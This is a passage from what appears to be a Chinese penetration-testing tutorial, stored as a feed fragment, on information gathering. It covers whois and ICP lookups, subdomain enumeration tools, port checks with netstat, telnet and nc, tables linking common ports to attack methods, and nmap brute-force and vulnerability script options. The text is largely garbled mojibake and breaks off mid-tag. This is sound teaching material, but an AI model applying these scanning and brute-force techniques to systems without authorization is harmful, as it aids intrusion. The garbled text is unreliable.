        <content type="html"><![CDATA[<h4 id="ä¿¡æ¯æ”¶é›†å†…å®¹"><a href="#ä¿¡æ¯æ”¶é›†å†…å®¹" class="headerlink" title="ä¿¡æ¯æ”¶é›†å†…å®¹"></a>ä¿¡æ¯æ”¶é›†å†…å®¹</h4><p>åœ¨åˆ’å®šäº†æµ‹è¯•èŒƒå›´ä¹‹åï¼Œå°±éœ€è¦è¿›å…¥ä¿¡æ¯æ”¶é›†é˜¶æ®µã€‚åœ¨è¿™ä¸ªé˜¶æ®µï¼Œæ¸—é€äººå‘˜éœ€è¦ä½¿ç”¨å„ç§å…¬å¼€èµ„æºå°½å¯èƒ½åœ°è·å–æµ‹è¯•ç›®æ ‡çš„ç›¸å…³ä¿¡æ¯ã€‚ä»–ä»¬æœé›†ä¿¡æ¯çš„äº’è”ç½‘æ¸ é“ä¸»è¦æœ‰ï¼šè®ºå›&#x2F;å…¬å‘Šæ¿&#x2F;æ–°é—»ç»„&#x2F;åª’ä½“æ–‡ç« &#x2F;åšå®¢&#x2F;ç¤¾äº¤ç½‘ç»œ&#x2F;github&#x2F;å…¶ä»–å•†ä¸šæˆ–éå•†ä¸šæ€§çš„ç½‘ç«™ã€‚æ­¤å¤–ï¼Œä»–ä»¬ä¹Ÿå¯ä»¥å€ŸåŠ©å„ç§æœç´¢å¼•æ“ä¸­è·å–ç›¸å…³æ•°æ®ï¼Œå¦‚è°·æ­Œã€é›…è™ã€MSNå¿…åº”ã€ç™¾åº¦ç­‰ã€‚æ”¶é›†çš„ä¿¡æ¯ä¸»è¦åŒ…æ‹¬:</p><p>ï¼ˆ1ï¼‰æ”¶é›†ç›®æ ‡ç½‘ç«™æœåŠ¡å™¨ä¿¡æ¯ï¼šåŸŸåã€å­åŸŸåã€CNAMEã€cdnã€çœŸå®IPã€ç³»ç»Ÿç±»å‹ã€ç‰ˆæœ¬ç­‰ï¼›</p><p>ï¼ˆ2ï¼‰è¯†åˆ«å¹¶æ”¶é›†ç›®æ ‡ç½‘ç«™æŒ‡çº¹ä¿¡æ¯ï¼šCMSã€ä¸­é—´ä»¶ã€ç½‘é¡µç¼–ç¨‹è¯­è¨€ç­‰åŠå…¶é€šç”¨æ¼æ´è°ƒæŸ¥æ”¶é›†ï¼›</p><p>ï¼ˆ3ï¼‰æ‰«æå¹¶æ”¶é›†ç›®æ ‡ç½‘ç«™ç›®å½•ç»“æ„ï¼šä¸€äº›æ–‡ä»¶å¯ä»¥è®¿é—®è·å¾—ä¿¡æ¯ã€åå°ç®¡ç†é¡µé¢ä½ç½®ã€æ—¥å¿—ä½ç½®ç­‰ï¼›</p><p>ï¼ˆ4ï¼‰ç½‘ç«™çš„æ•æ„Ÿä¿¡æ¯ï¼š</p><p>whoisä¿¡æ¯ã€å§“åã€å¤‡æ¡ˆã€é‚®ç®±ã€ç”µè¯åæŸ¥ï¼ˆé‚®ç®±ä¸¢ç¤¾å·¥åº“ï¼Œç¤¾å·¥å‡†å¤‡ç­‰ï¼‰ï¼›<br>å¼±å£ä»¤æ‰«æã€å¯†ç çˆ†ç ´ç­‰ï¼ˆå¦‚é’ˆå¯¹ç³»ç»Ÿç®¡ç†å‘˜ã€ç½‘ç«™åå°ç®¡ç†å‘˜ã€æ•°æ®åº“ç®¡ç†å‘˜ç­‰ï¼‰ï¼›<br>ç½‘ç«™æºç æ˜¯å¦æ³„éœ²ç­‰ï¼Œå¦‚githubæºç ã€‚<br>ï¼ˆ5ï¼‰æ”¶é›†ç›®æ ‡æœåŠ¡å™¨ä¸»æœºç«¯å£ä¿¡æ¯ï¼šä¸åŒç«¯å£æä¾›ä¸åŒçš„æ”»å‡»æ€è·¯å’Œæ–¹å‘ï¼›</p><p>ï¼ˆ6ï¼‰ç½‘ç»œé˜²æŠ¤ä¿¡æ¯ï¼šç½‘ç»œè¾¹ç•Œè®¾å¤‡æˆ–ç½‘ç»œèŠ‚ç‚¹è®¾å¤‡ï¼Œå¦‚æœ‰æ²¡æœ‰é˜²ç«å¢™ï¼Œæœ‰æ²¡æœ‰IPSã€IDSæˆ–WAFï¼Œç½‘ç»œè¡Œä¸ºç®¡ç†ï¼Œå…¨æµé‡åˆ†æã€‚</p><p>æ”¶é›†çš„ä¿¡æ¯è¶Šå¤šï¼Œæ¸—é€æµ‹è¯•æˆåŠŸçš„æ¦‚ç‡è¶Šé«˜ã€‚<br>åœ¨ä¿¡æ¯æ”¶é›†ä¸­ï¼Œæœ€ä¸»è¦çš„å°±æ˜¯æ”¶é›†æœåŠ¡å™¨çš„é…ç½®ä¿¡æ¯å’Œç½‘ç«™çš„æ•æ„Ÿä¿¡æ¯ï¼Œå…¶ä¸­åŒ…æ‹¬åŸŸååŠå­åŸŸåä¿¡æ¯ã€ç›®æ ‡ç½‘ç«™ç³»ç»Ÿã€CMSæŒ‡çº¹ã€ç›®æ ‡ç½‘ç«™çœŸå®IP ã€å¼€æ”¾çš„ç«¯å£ç­‰ã€‚æ¢å¥è¯è¯´ï¼Œåªè¦æ˜¯ä¸ç›®æ ‡ç½‘ç«™ç›¸å…³çš„ä¿¡æ¯ï¼Œæˆ‘ä»¬éƒ½åº”è¯¥å»å°½é‡æœé›†ã€‚</p><h4 id="åŸŸåç›¸å…³ä¿¡æ¯"><a href="#åŸŸåç›¸å…³ä¿¡æ¯" class="headerlink" title="åŸŸåç›¸å…³ä¿¡æ¯"></a>åŸŸåç›¸å…³ä¿¡æ¯</h4><p>çŸ¥é“ç›®æ ‡çš„åŸŸåä¹‹åï¼Œæˆ‘ä»¬è¦åšçš„ç¬¬ä¸€ä»¶äº‹å°±æ˜¯è·å–åŸŸåçš„æ³¨å†Œä¿¡æ¯ï¼Œæ³¨æ„å…³æ³¨è¯¥åŸŸåçš„æ³¨å†Œå•†å’Œæ³¨å†Œäººçš„è”ç³»æ–¹å¼ï¼ˆç”µè¯å’Œé‚®ç®±ï¼‰ç­‰ä¿¡æ¯ã€‚</p><h5 id="åŸŸååˆ†ç±»"><a href="#åŸŸååˆ†ç±»" class="headerlink" title="åŸŸååˆ†ç±»"></a>åŸŸååˆ†ç±»</h5><p>å›½é™…åŸŸåï¼š.com(å•†ä¸šå…¬å¸);:net(ç½‘ç»œæœåŠ¡):.org(ç»„ç»‡åä¼šç­‰);.gov(æ”¿åºœéƒ¨é—¨);.edu(æ•™è‚²æœºæ„);.mil(å†›äº‹é¢†åŸŸ);.int(å›½é™…ç»„ç»‡)</p><p>å›½åˆ«åŸŸåï¼š.CNä»£è¡¨ä¸­å›½ï¼Œ.UKä»£è¡¨è‹±å›½ï¼Œ.USä»£è¡¨ç¾å›½ã€€</p><p>æ–°é¡¶çº§åŸŸåï¼šbiz,infoï¼Œnameï¼Œpro, aero, coop, museumâ€¦</p><h5 id="åŸŸåä¿¡æ¯æŸ¥è¯¢æ–¹å¼"><a href="#åŸŸåä¿¡æ¯æŸ¥è¯¢æ–¹å¼" class="headerlink" title="åŸŸåä¿¡æ¯æŸ¥è¯¢æ–¹å¼"></a>åŸŸåä¿¡æ¯æŸ¥è¯¢æ–¹å¼</h5><h6 id="whoisæŸ¥è¯¢"><a href="#whoisæŸ¥è¯¢" class="headerlink" title="whoisæŸ¥è¯¢"></a>whoisæŸ¥è¯¢</h6><p>Whoisæ˜¯ä¸€ä¸ªæ ‡å‡†çš„äº’è”ç½‘åè®®ï¼Œ å¯ç”¨äºæ”¶é›†åŸŸåæ³¨å†Œä¿¡æ¯ï¼Œæ³¨å†Œçš„åŸŸåã€IPåœ°å€ç­‰ä¿¡æ¯ã€‚ç®€å•æ¥è¯´ï¼Œ Whoiså°±æ˜¯ä¸€ä¸ªç”¨äºæŸ¥è¯¢åŸŸåæ˜¯å¦</p><p>å·±è¢«æ³¨å†Œä»¥åŠæ³¨å†ŒåŸŸåçš„è¯¦ç»†ä¿¡æ¯çš„æ•°æ®åº“ï¼ˆå¦‚åŸŸåæ‰€æœ‰äººã€åŸŸåæ³¨å†Œå•†ï¼‰ã€‚</p><p>åœ¨WhoisæŸ¥è¯¢ä¸­ï¼Œå¾—åˆ°æ³¨å†Œäººçš„å§“åå’Œé‚®ç®±ä¿¡æ¯é€šå¸¸å¯¹æµ‹è¯•ä¸ªäººç«™ç‚¹éå¸¸æœ‰ç”¨ï¼Œå› ä¸ºæˆ‘ä»¬å¯ä»¥é€šè¿‡æœç´¢å¼•æ“å’Œç¤¾äº¤ç½‘ç»œæŒ–æ˜å‡ºåŸŸåæ‰€æœ‰äºº</p><p>çš„å¾ˆå¤šä¿¡æ¯ã€‚å¯¹ä¸­å°ç«™ç‚¹è€Œè¨€ï¼ŒåŸŸåæ‰€æœ‰äººå¾€å¾€å°±æ˜¯ç®¡ç†å‘˜ã€‚</p><ul><li><strong>Kaliç³»ç»Ÿ</strong>ï¼šåœ¨Kaliç³»ç»Ÿä¸­ï¼Œ Whois å·±ç»é»˜è®¤å®‰è£…ï¼Œåªéœ€è¾“å…¥è¦æŸ¥è¯¢çš„åŸŸåå³å¯ï¼Œä»£ç ä¸º<code>whois+åŸŸå</code>ï¼ˆä¸€èˆ¬åŸŸåä¸åŒ…å«ä¸»æœºåï¼Œå¦‚</li></ul><p>Â·baidu.comï¼‰ã€‚æ³¨æ„ï¼ŒKaliç³»ç»Ÿéœ€è¿æ¥çœŸå®ç½‘ç»œï¼Œèƒ½ä¸Šç½‘ã€‚</p><ul><li><strong><a href="https://whois.chinaz.com/">ç«™é•¿ä¹‹å®¶</a></strong></li><li><strong><a href="https://whois.aliyun.com/">é˜¿é‡Œäº‘æŸ¥è¯¢</a></strong></li></ul><h6 id="åæŸ¥"><a href="#åæŸ¥" class="headerlink" title="åæŸ¥"></a>åæŸ¥</h6><p><a href="https://whois.chinaz.com/reverse/">é‚®ç®±åæŸ¥ æ³¨å†ŒäººåæŸ¥ ç”µè¯åæŸ¥</a></p><h6 id="å¤‡æ¡ˆä¿¡æ¯æŸ¥è¯¢"><a href="#å¤‡æ¡ˆä¿¡æ¯æŸ¥è¯¢" class="headerlink" title="å¤‡æ¡ˆä¿¡æ¯æŸ¥è¯¢"></a>å¤‡æ¡ˆä¿¡æ¯æŸ¥è¯¢</h6><ul><li><strong><a href="https://www.beianx.cn/">ICPå¤‡æ¡ˆæŸ¥è¯¢ç½‘</a></strong></li><li><strong><a href="http://www.tianyancha.como/">å¤©çœ¼æŸ¥</a></strong></li><li><strong><a href="https://beian.miit.gov.cn/?wm=gwo#/Integrated/index">ICP&#x2F;IPåœ°å€&#x2F;åŸŸåä¿¡æ¯å¤‡æ¡ˆç®¡ç†ç³»ç»Ÿ</a></strong></li></ul><h5 id="å­åŸŸåä¿¡æ¯æŸ¥è¯¢æ–¹å¼"><a href="#å­åŸŸåä¿¡æ¯æŸ¥è¯¢æ–¹å¼" class="headerlink" title="å­åŸŸåä¿¡æ¯æŸ¥è¯¢æ–¹å¼"></a>å­åŸŸåä¿¡æ¯æŸ¥è¯¢æ–¹å¼</h5><p>å­åŸŸåä¹Ÿå°±æ˜¯äºŒçº§åŸŸåï¼Œ æ˜¯æŒ‡é¡¶çº§åŸŸåä¸‹çš„åŸŸåã€‚å‡è®¾æˆ‘ä»¬çš„ç›®æ ‡ç½‘ç»œè§„æ¨¡æ¯”è¾ƒå¤§ï¼Œç›´æ¥ä»ä¸»åŸŸå…¥æ‰‹æ˜¾ç„¶æ˜¯å¾ˆä¸ç†æ™ºçš„ï¼Œ å› ä¸ºå¯¹äºè¿™ç§</p><p>è§„æ¨¡çš„ç›®æ ‡ï¼Œ ä¸€èˆ¬å…¶ä¸»åŸŸéƒ½æ˜¯é‡ç‚¹é˜²æŠ¤åŒºåŸŸï¼Œæ‰€ä»¥ä¸å¦‚å…ˆè¿›å…¥ç›®æ ‡çš„æŸä¸ªå­åŸŸï¼Œç„¶åå†æƒ³åŠæ³•è¿‚å›æ¥è¿‘çœŸæ­£çš„ç›®æ ‡ï¼Œè¿™æ— ç–‘æ˜¯ä¸ªæ¯”è¾ƒå¥½</p><p>çš„é€‰æ‹©ã€‚</p><ul><li><p><strong><a href="https://searchdns.netcraft.com/">Whatâ€™s that site running?</a></strong></p></li><li><p><strong><a href="https://github.com/euphrat1ca/LayerDomainFinder">Layerå­åŸŸåæŒ–æ˜æœº</a></strong></p></li><li><p><strong><a href="https://github.com/aboul3la/Sublist3r">Sublist3r</a></strong></p></li><li><p><strong><a href="https://github.com/lijiejie/subDomainsBrute">subDomainsBrute</a></strong></p></li><li><p><strong>Googleè¯­æ³•  site:xxx.com</strong></p></li><li><p><strong><a href="https://crt.sh/">è¯ä¹¦é€æ˜åº¦å…¬å¼€æ›°å¿—æšä¸¾</a></strong></p></li></ul><h4 id="IPç›¸å…³ä¿¡æ¯"><a href="#IPç›¸å…³ä¿¡æ¯" class="headerlink" title="IPç›¸å…³ä¿¡æ¯"></a>IPç›¸å…³ä¿¡æ¯</h4><ul><li><p><strong><a href="http://ip.chinaz.com/">IPæŸ¥è¯¢</a></strong></p></li><li><p><strong><a href="https://ip.chinaz.com/linksip">åŒIPæŸ¥è¯¢</a></strong></p></li><li><p><strong><a href="https://www.maxmind.com/en/home">IPç»çº¬åº¦</a></strong></p></li></ul><h4 id="ç«¯å£æœåŠ¡ç›¸å…³ä¿¡æ¯"><a href="#ç«¯å£æœåŠ¡ç›¸å…³ä¿¡æ¯" class="headerlink" title="ç«¯å£æœåŠ¡ç›¸å…³ä¿¡æ¯"></a>ç«¯å£æœåŠ¡ç›¸å…³ä¿¡æ¯</h4><p>æŸ¥çœ‹æœ¬æœºç«¯å£</p><p>Windowsï¼šnetstat -aon|findstr 3306</p><p>Linux: netstat -an|grep 3306 </p><p>è¿œç¨‹æœºå™¨ç«¯å£</p><p>telnet 192.168.142.137 80 </p><p>wget 192.168.142.137 80 </p><p>nc -vz 192.168.142.137 445</p><h5 id="å¸¸è§ç«¯å£åŠæ¼æ´"><a href="#å¸¸è§ç«¯å£åŠæ¼æ´" class="headerlink" title="å¸¸è§ç«¯å£åŠæ¼æ´"></a>å¸¸è§ç«¯å£åŠæ¼æ´</h5><h6 id="æ–‡ä»¶å…±äº«æœåŠ¡"><a href="#æ–‡ä»¶å…±äº«æœåŠ¡" class="headerlink" title="æ–‡ä»¶å…±äº«æœåŠ¡"></a>æ–‡ä»¶å…±äº«æœåŠ¡</h6><table><thead><tr><th align="center">ç«¯å£å·</th><th>ç«¯å£è¯´æ˜</th><th>æ”»å‡»æ–¹å‘</th></tr></thead><tbody><tr><td align="center">21&#x2F;22&#x2F;69</td><td>FTP&#x2F;SFTPæ–‡ä»¶ä¼ è¾“åè®®</td><td>å…è®¸åŒ¿åä¸Šä¼ ã€ä¸‹è½½ã€çˆ†ç ´å’Œå—…æ¢æ“ä½œ</td></tr><tr><td align="center">2049</td><td>NFSæœåŠ¡ï¼ˆNetworkFileSystemï¼‰</td><td>é…ç½®ä¸å½“</td></tr><tr><td align="center">139</td><td>SambaæœåŠ¡</td><td>çˆ†ç ´ã€æœªæˆæƒè®¿é—®ã€è¿œç¨‹ä»£ç å’Œæ‰§è¡Œ</td></tr><tr><td align="center">389</td><td>LDAPç›®å½•è®¿é—®åè®®</td><td>æ³¨å…¥ã€å…è®¸åŒ¿åè®¿é—®ã€å¼±å£ä»¤</td></tr></tbody></table><h6 id="è¿œç¨‹è¿æ¥æœåŠ¡ç«¯å£"><a href="#è¿œç¨‹è¿æ¥æœåŠ¡ç«¯å£" class="headerlink" title="è¿œç¨‹è¿æ¥æœåŠ¡ç«¯å£"></a>è¿œç¨‹è¿æ¥æœåŠ¡ç«¯å£</h6><table><thead><tr><th align="center">ç«¯å£å·</th><th>ç«¯å£è¯´æ˜</th><th>æ”»å‡»æ–¹å‘</th></tr></thead><tbody><tr><td align="center">22</td><td>SSHè¿œç¨‹è¿æ¥</td><td>çˆ†ç ´ã€SSHéš§é“åŠå†…ç½‘ä»£ç†è½¬å‘ æ–‡ä»¶ä¼ è¾“</td></tr><tr><td align="center">23</td><td>Telnetè¿œç¨‹è¿æ¥</td><td>çˆ†ç ´ã€å—…æ¢ã€å¼±å£ä»¤</td></tr><tr><td align="center">3389</td><td>RDPè¿œç¨‹æ¡Œé¢è¿æ¥</td><td>Shiftåé—¨ï¼ˆWindowsServer2003ä»¥ä¸‹çš„ç³»ç»Ÿï¼‰ã€çˆ†ç ´</td></tr><tr><td align="center">5900</td><td>VNC</td><td>å¼±å£ä»¤çˆ†ç ´</td></tr><tr><td align="center">5632</td><td>PcAnywhereè¿œç¨‹æ§åˆ¶æœåŠ¡</td><td>æŠ“å¯†ç ã€ä»£ç æ‰§è¡Œ</td></tr></tbody></table><h6 id="æ•°æ®åº“æœåŠ¡ç«¯å£"><a href="#æ•°æ®åº“æœåŠ¡ç«¯å£" class="headerlink" title="æ•°æ®åº“æœåŠ¡ç«¯å£"></a>æ•°æ®åº“æœåŠ¡ç«¯å£</h6><table><thead><tr><th>ç«¯å£å·</th><th>ç«¯å£è¯´æ˜</th><th>æ”»å‡»æ–¹å‘</th></tr></thead><tbody><tr><td>3306</td><td>MySQL</td><td>æ³¨å…¥ã€ææƒã€çˆ†ç ´</td></tr><tr><td>1433</td><td>MSSQLæ•°æ®åº“</td><td>æ³¨å…¥ã€ææƒã€SAå¼±å£ä»¤</td></tr><tr><td>1521</td><td>Oracleæ•°æ®åº“</td><td>TNSçˆ†ç ´ã€æ³¨å…¥ã€åå¼¹shell</td></tr><tr><td>5432</td><td>PostgreSQLæ•°æ®åº“</td><td>çˆ†ç ´ã€æ³¨å…¥ã€å¼±å£ä»¤</td></tr><tr><td>27017&#x2F;27018</td><td>MongoDB</td><td>çˆ†ç ´ã€æœªæˆæƒè®¿é—®</td></tr><tr><td>6379</td><td>Redisæ•°æ®åº“</td><td>å¯å°è¯•æœªæˆæƒè®¿é—®ã€å¼±å£ä»¤çˆ†ç ´</td></tr><tr><td>5000</td><td>Sysbase&#x2F;DB2æ•°æ®åº“</td><td>çˆ†ç ´ã€æ³¨å…¥</td></tr></tbody></table><h6 id="é‚®ä»¶æœåŠ¡ç«¯å£"><a href="#é‚®ä»¶æœåŠ¡ç«¯å£" class="headerlink" title="é‚®ä»¶æœåŠ¡ç«¯å£"></a>é‚®ä»¶æœåŠ¡ç«¯å£</h6><table><thead><tr><th>ç«¯å£å·</th><th>ç«¯å£è¯´æ˜</th><th>æ”»å‡»æ–¹å‘</th></tr></thead><tbody><tr><td>25</td><td>SMTPé‚®ä»¶æœåŠ¡</td><td>é‚®ä»¶ä¼ªé€ </td></tr><tr><td>110</td><td>POP3åè®®</td><td>çˆ†ç ´ã€å—…æ¢</td></tr><tr><td>143</td><td>IMAPåè®®</td><td>çˆ†ç ´</td></tr></tbody></table><h6 id="ç½‘ç»œå¸¸è§åè®®ç«¯å£"><a href="#ç½‘ç»œå¸¸è§åè®®ç«¯å£" class="headerlink" title="ç½‘ç»œå¸¸è§åè®®ç«¯å£"></a>ç½‘ç»œå¸¸è§åè®®ç«¯å£</h6><table><thead><tr><th>ç«¯å£å·</th><th>ç«¯å£è¯´æ˜</th><th>æ”»å‡»æ–¹å‘</th></tr></thead><tbody><tr><td>53</td><td>DNSåŸŸåç³»ç»Ÿ</td><td>å…è®¸åŒºåŸŸä¼ é€ã€DNSåŠ«æŒ  ç¼“å­˜æŠ•æ¯’ã€æ¬ºéª—</td></tr><tr><td>67&#x2F;68</td><td>DHCPæœåŠ¡</td><td>åŠ«æŒã€æ¬ºéª—</td></tr><tr><td>161</td><td>SNMPåè®®</td><td>çˆ†ç ´ã€æœé›†ç›®æ ‡å†…ç½‘ä¿¡æ¯</td></tr></tbody></table><h6 id="ç‰¹æ®ŠæœåŠ¡ç«¯å£"><a href="#ç‰¹æ®ŠæœåŠ¡ç«¯å£" class="headerlink" title="ç‰¹æ®ŠæœåŠ¡ç«¯å£"></a>ç‰¹æ®ŠæœåŠ¡ç«¯å£</h6><table><thead><tr><th>ç«¯å£å·</th><th>ç«¯å£è¯´æ˜</th><th>æ”»å‡»æ–¹å‘</th></tr></thead><tbody><tr><td>2181</td><td>ZookeeperæœåŠ¡</td><td>æœªæˆæƒè®¿é—®</td></tr><tr><td>8069</td><td>ZabbixæœåŠ¡</td><td>è¿œç¨‹æ‰§è¡Œã€SQLæ³¨å…¥</td></tr><tr><td>9200&#x2F;9300</td><td>ElasticsearchæœåŠ¡</td><td>è¿œç¨‹æ‰§è¡Œ</td></tr><tr><td>11211</td><td>MemcachedæœåŠ¡</td><td>æœªæˆæƒè®¿é—®</td></tr><tr><td>512&#x2F;513&#x2F;514</td><td>LinuxRexecæœåŠ¡</td><td>çˆ†ç ´ã€rloginç™»å½•</td></tr><tr><td>873</td><td>RsyncæœåŠ¡</td><td>åŒ¿åè®¿é—®ã€æ–‡ä»¶ä¸Šä¼ </td></tr><tr><td>3690</td><td>SVNæœåŠ¡</td><td>SVNæ³„éœ²ã€æœªæˆæƒè®¿é—®</td></tr><tr><td>50000</td><td>SAPManagementConsole</td><td>è¿œç¨‹æ‰§è¡Œ</td></tr></tbody></table><h5 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h5><p>Nmap ï¼ˆNetwork Mapper <a href="https://nmap.org/">https://nmap.org/</a></p><p>1ï¼‰æ‰«æä¸»æœº(HostiDiscovery)</p><p>2ï¼‰æ‰«æç«¯å£(Port Scanningï¼‰</p><p>3ï¼‰æ¢æµ‹æ“ä½œç³»ç»Ÿã€è½¯ä»¶ç‰ˆæœ¬ï¼ˆOperating System Detectionã€Version Detection)</p><p>å‚æ•°ç±»å‹</p><p>nmapâ€“help</p><ul><li><p>TARGETSPECIFICATIOM:è‡ªæ ‡ï¼Œå¯¹ä»€ä¹ˆè¿›è¡Œæ‰«æï¼Œæ¯”å¦‚æ˜¯åŸŸåã€TPæˆ–è€…ç½‘ç»œ</p></li><li><p>HOSTDISCOVERY:ä¸»æœºå‘ç°ï¼Œæ€ä¹ˆå¯¹ä¸»æœºè¿›è¡Œæ‰«æï¼Œæ¯”å¦‚ç®€å•æ‰«æï¼Œè¿˜æ˜¯å…¨éƒ¨ï¼Œæ‰«ä¸€éï¼Œæˆ–è€…ç”¨ç›¸åº”çš„åè®®æ‰«</p></li><li><p>SCANTECHNIOQUESï¼šæ‰«ææŠ€æœ¯ï¼Œåè®®æ—¥å‹ºè®¾ç½®</p></li><li><p>PORTSPECIFICATIONANDSCANORDER:ç«¯å£å’Œæ‰«æé¡ºåºè®¾ç½® SERVICEVERSIONDETECTION:æœåŠ¡å’Œç‰ˆæœ¬è¯†åˆ«</p></li><li><p>SCRIPT SCAN:ä½¿ç”¨è„šæœ¬ï¼Œnmapæœ¬èº«å†…ç½®äº†å¤§é‡çš„luaè„šæœ¬ï¼Œè€Œä¸”è¿˜å¯ä»¥è‡ªå·±ç¼–å†™è„šæœ¬</p></li><li><p>OS DETECTION:æ“ä½œç³»ç»Ÿè¯†åˆ«</p></li><li><p>TIMING AND PERFORMANCE:æ—¶é—´å’Œæ€§èƒ½è®¾ç½®ï¼Œæ¯”å¦‚æ‰«æé¢‘ç‡ã€é‡è¯•æ¬¡æ•°ç­‰ç­‰ FIREWALL&#x2F;IDS EVASION AND SPOOFING:é˜²ç«å¢™ç»•è¿‡å’Œæ¬ºéª—ï¼Œæ¯”å¦‚ä½¿ç”¨ä»£ç†å‡IPç­‰</p></li><li><p>OUTPUT:æŠŠæ‰«ææ¥å‡ºè¾“å‡ºåˆ°æ–‡ä»¶ MISCï¼šå¯ç”¨IPv6ç­‰ç­‰é…ç½®</p></li></ul><p>nmapæœ¬èº«å†…ç½®äº†å¤§é‡çš„luaè„šæœ¬ï¼Œè€Œä¸”è¿˜å¯ä»¥è‡ªå·±å·²ç¼–å†™è„šæœ¬ </p><p>Is &#x2F;usr&#x2F;share&#x2F;nmap&#x2F;scripts&#x2F; I wc -1</p><p>å…¨éƒ¨æ¸…å•ï¼š<a href="https://nmap.org/book/nse.html">Nmap Scripting Engine</a></p><p>ä¾‹å¦‚ï¼š</p><p>nmap 192.168.142.137 â€“script http-enum åˆ—ä¸¾HTTPæœåŠ¡</p><p>nmapâ€“script&#x3D;authç»•è¿‡é‰´æƒ </p><p>nmapâ€“script&#x3D;brute æš´åŠ›ç ´è§£ nmap â€“script&#x3D;vuln æ‰«ææ¼æ´</p><h4 id="æŒ‡çº¹è¯†åˆ«"><a href="#æŒ‡çº¹è¯†åˆ«" class="headerlink" title="æŒ‡çº¹è¯†åˆ«"></a>æŒ‡çº¹è¯†åˆ«</h4><p><strong>è¯†åˆ«å¯¹è±¡</strong></p><ol><li>CMSä¿¡æ¯ï¼šæ¯”å¦‚Discuzã€ç»‡æ¢¦ã€å¸å›½CMSã€PHPCMSã€ECshopç­‰</li><li>å‰ç«¯æŠ€æœ¯ï¼šæ¯”å¦‚HTML5ã€jqueryã€bootstrapã€Vueã€aceç­‰;</li><li>å¼€å‘è¯­è¨€ï¼šæ¯”å¦‚PHPã€Javaã€Rubyã€Pythonã€C#ç­‰;</li><li>WebæœåŠ¡å™¨ï¼šæ¯”å¦‚Apacheã€ Nginxã€IISã€lighttpdç­‰;</li><li>åº”ç”¨æœåŠ¡å™¨ï¼šæ¯”å¦‚Tomcatã€Jbossã€Weblogicã€Websphereç­‰;</li><li>æ“ä½œç³»ç»Ÿä¿¡æ¯ï¼šæ¯”å¦‚Linuxã€win2k8ã€win7ã€Kaliã€Centosç­‰;</li><li>CDNä¿¡æ¯ï¼šæ˜¯å¦ä½¿ç”¨CDNï¼Œå¦‚cloudflareã€å¸è”ã€è“è®¯ã€ç½‘å®¿ã€ä¸ƒç‰›äº‘ã€é˜¿é‡Œäº‘ç­‰ï¼›</li><li>WAFä¿¡æ¯ï¼šæ˜¯å¦ä½¿ç”¨WAFï¼Œå¦‚Dç›¾ã€äº‘é”ã€å®å¡”ã€å®‰å…¨ç‹—ã€360ç­‰</li></ol><h5 id="CMSæŒ‡çº¹è¯†åˆ«"><a href="#CMSæŒ‡çº¹è¯†åˆ«" class="headerlink" title="CMSæŒ‡çº¹è¯†åˆ«"></a>CMSæŒ‡çº¹è¯†åˆ«</h5><p>å†…å®¹ç®¡ç†ç³»ç»Ÿ</p><p>Content Management System</p><p>é€šè¿‡å…³é”®ç‰¹å¾å™¨ã€å¼€å‘è¯­è¨€ã€ç‰ˆæœ¬ç­‰ç­‰</p><p>è¯†åˆ«å‡ºæœˆæ ‡çš„CMSç³»ç»Ÿã€æœåŠ¡æ“ä½œç³»ç»Ÿã€CDNã€WAFçš„ç±»åˆ«</p><h6 id="å¸¸è§çš„CMS"><a href="#å¸¸è§çš„CMS" class="headerlink" title="å¸¸è§çš„CMS"></a><strong>å¸¸è§çš„CMS</strong></h6><p>åšå®¢ï¼ˆæ¯”å¦‚CSDNã€åšå®¢å›­ï¼‰ã€å¾®åšã€ç«™ã€å¯¼èˆªç½‘ç«™ï¼ˆhao123ï¼‰ã€ä¿¡æ¯åˆ†ç±»ï¼ˆçŸ¥ä¹ï¼‰ã€å•†åŸã€ç™¾ç§‘â€¦ï¼ã€€</p><p>é—®ç­”ç½‘ç«™ã€ä¼ä¸šå®˜ç½‘ã€å­¦æ ¡å®˜ç½‘ã€åŒ»é™¢å®˜ç½‘ã€å›¢è´­ç½‘(58ï¼‰</p><p><img src="CMS.png" loading="lazy"></p><h6 id="å„ç±»ç½‘ç«™å¼€æºCMS"><a href="#å„ç±»ç½‘ç«™å¼€æºCMS" class="headerlink" title="å„ç±»ç½‘ç«™å¼€æºCMS"></a><strong>å„ç±»ç½‘ç«™å¼€æºCMS</strong></h6><ul><li>ä¼ä¸šå»ºç«™ç³»ç»Ÿï¼šMetlnfo(ç±³æ‹“)ã€è‰çŸ¥ã€SiteServer CMSç­‰;</li><li>B2Cå•†åŸç³»ç»Ÿï¼šå•†æ´¾Shopexã€ECshopã€HiShopã€XpShopç­‰</li><li>é—¨æˆ·å»ºç«™ç³»ç»Ÿï¼šDedeCMS(ç»‡æ¢¦)ã€å¸å›½CMSã€PHPCMSã€åŠ¨æ˜“CmsTopç­‰;</li><li>åšå®¢ç³»ç»Ÿï¼šWordPressã€Z-Blogç­‰</li><li>è®ºå›ç¤¾åŒºï¼šDiscuzã€PHPwindã€WeCenterç­‰</li><li>é—®ç­”ç³»ç»Ÿï¼šTipaskã€whatsnsç­‰</li><li>çŸ¥è¯†ç™¾ç§‘ç³»ç»Ÿï¼šHDwiki;</li><li>B2Bé—¨æˆ·ç³»ç»Ÿï¼šDestoonã€B2Bbuilderã€å‹é‚»B2Bç­‰</li><li>äººæ‰æ‹›è˜ç½‘ç«™ç³»ç»Ÿï¼šéª‘å£«CMSã€PHPäº‘äººæ‰ç®¡ç†ç³»ç»Ÿ</li><li>æˆ¿äº§ç½‘ç«™ç³»ç»Ÿï¼šFangCmsç­‰;</li><li>åœ¨çº¿æ•™è‚²å»ºç«™ç³»ç»Ÿï¼šKesionã€EduSoho;</li><li>ç”µå½±ç½‘ç«™ç³»ç»Ÿï¼šè‹¹æœcMSã€ctcmsã€movcmsç­‰</li><li>å°è¯´æ–‡å­¦å»ºç«™ç³»ç»Ÿï¼šæ°å¥‡CMS</li></ul><h6 id="CMSæŒ‡çº¹è¯†åˆ«æ€è·¯"><a href="#CMSæŒ‡çº¹è¯†åˆ«æ€è·¯" class="headerlink" title="CMSæŒ‡çº¹è¯†åˆ«æ€è·¯"></a>CMSæŒ‡çº¹è¯†åˆ«æ€è·¯</h6><p>ç‰ˆæƒä¿¡æ¯ã€ç‰¹å®šæ–‡ä»¶MD5å€¼ã€æŸ¥çœ‹ç½‘é¡µæºä»£ç ã€é€šè¿‡ç‰¹å®šæ–‡ä»¶åˆ†æ</p><h6 id="CMSè¯†åˆ«å·¥å…·"><a href="#CMSè¯†åˆ«å·¥å…·" 